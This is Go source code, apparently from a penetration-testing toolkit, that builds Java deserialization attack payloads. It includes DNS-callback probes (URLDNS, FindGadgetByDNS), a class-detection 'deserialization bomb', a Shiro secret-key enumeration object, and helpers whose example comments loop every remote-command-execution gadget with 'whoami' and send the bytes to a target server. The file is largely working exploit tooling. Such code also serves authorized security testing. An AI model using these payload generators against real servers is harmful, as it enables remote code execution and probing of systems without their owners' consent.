// GetURLDNSJavaObject uses the characteristics of the Java URL class to generate a Java object that will attempt to perform a DNS query on the provided URL during deserialization.
// This function first uses the predefined URLDNS serialization template, and then replaces the preset URL placeholder in the serialized object with the provided URL string.
// url: URL string to be set in the generated Java object.
// Return: Return the constructed Java object and nil error on success, return nil and corresponding error on failure.
// Example:
// ```
// url, token, _ = risk.NewDNSLogDomain()
// javaObject, _ = yso.GetURLDNSJavaObject(url)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// uses the constructed deserialized Payload(gadgetBytes) and sends it to the target server.
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog query fails
//	} else {
//	  if len(res) > 0{
//	   // dnslog query successful
//	  }
//	}
//
// ```
func GetURLDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_URLDNS)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "1.1.1.1", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "URLDNS",
		NameVerbose:     "URLDNS",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

// GetFindGadgetByDNSJavaObject detects the CLass Name through DNSLOG and then detects the Gadget.
// uses the predefined FindGadgetByDNS serialization template, and then replaces the preset URL placeholder in the serialized object with the provided URL string.
// url: URL string to be set in the generated Java object.
// Return: Return the constructed Java object and nil error on success, return nil and corresponding error on failure.
// Example:
// ```
// url, token, _ = risk.NewDNSLogDomain()
// javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
// gadgetBytes,_ = yso.ToBytes(javaObject)
// uses the constructed deserialized Payload(gadgetBytes) and sends it to the target server.
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog query fails
//	} else {
//	  if len(res) > 0{
//	   // dnslog query successful
//	  }
//	}
//
// ```
func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_GADGETFINDER)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "{{DNSURL}}", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "FindGadgetByDNS",
		NameVerbose:     "FindGadgetByDNS",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

// When the GetFindClassByBombJavaObject target has the specified ClassName, it will consume part of the server performance to achieve indirect delay.
// uses the predefined FindClassByBomb to serialize the template, and then replaces the preset ClassName placeholder in the serialized object with the provided ClassName string.
// className: The Class Name value of whether the target server to be criticized exists.
// Return: Return the constructed Java object and nil error on success, return nil and corresponding error on failure.
// Example:
// ```
// javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // detects whether the java.lang.String class exists on the target server.
// gadgetBytes,_ = yso.ToBytes(javaObject)
// uses the constructed deserialized Payload (gadgetBytes) to send to the target server, and determines whether the target server exists through the response time. java.lang.String class
// ```
func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_FindClassByBomb)
	if err != nil {
		return nil, err
	}
	err = ReplaceClassNameInJavaSerilizable(obj, "{{ClassName}}", className, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "FindClassByBomb",
		NameVerbose:     "FindClassByBomb",
		SupportTemplate: false,
		Help:            "detects Gadget by constructing a deserialization bomb",
	}), nil
}

// GetSimplePrincipalCollectionJavaObject generates and returns a Java object based on the SimplePrincipalCollection serialization template.
// is mainly used to determine the number of rememberMe cookies when detecting Shiro vulnerabilities.
// uses an empty SimplePrincipalCollection as the payload. After serialization, it uses the secret key to be detected to encrypt and send it. The response performance of correct and incorrect secret keys is different. You can use this method to reliably enumerate the secrets currently used by Shiro. key.
// ```
func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_simplePrincipalCollection)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "SimplePrincipalCollection",
		NameVerbose:     "SimplePrincipalCollection",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

// GetAllGadget Gets all supported Gadgets
// ```
func GetAllGadget() []interface{} {
	var alGadget []any
	for _, gadget := range AllGadgets {
		alGadget = append(alGadget, gadget.Generator)
	}
	return alGadget
}

// GetAllTemplatesGadget Get all Gadgets that support templates, which can be used for blasting gadgets
// Example:
// ```
//
//	for _, gadget := range yso.GetAllTemplatesGadget() {
//		domain := "xxx.dnslog" // dnslog address
//		javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
//		if javaObj == nil || err != nil {
//			continue
//		}
//		objBytes, err := yso.ToBytes(javaObj)
//		if err != nil {
//			continue
//		}
//		// Send objBytes
//	}
//
// ```
func GetAllTemplatesGadget() []TemplatesGadget {
	var alGadget []TemplatesGadget
	for _, gadget := range AllGadgets {
		if gadget.SupportTemplate {
			alGadget = append(alGadget, gadget.Generator.(func(options ...GenClassOptionFun) (*JavaObject, error)))
		}
	}
	return alGadget
}

// GetAllRuntimeExecGadget gets all supported RuntimeExecGadgets, which can be used to blast gadgets.
// Example:
// ```
//
//	command := "whoami" // Hypothetical command string
//	for _, gadget := range yso.GetAllRuntimeExecGadget() {
//		javaObj, err := gadget(command)
//		if javaObj == nil || err != nil {
//			continue
//		}
//		objBytes, err := yso.ToBytes(javaObj)
//		if err != nil {
//			continue
//		}
//		// Send objBytes
//	}
//
// ```
func GetAllRuntimeExecGadget() []RuntimeExecGadget {
	var alGadget []RuntimeExecGadget
	for _, gadget := range AllGadgets {
		if !gadget.SupportTemplate {
			alGadget = append(alGadget, gadget.Generator.(func(cmd string) (*JavaObject, error)))
		}
	}
	return alGadget
}
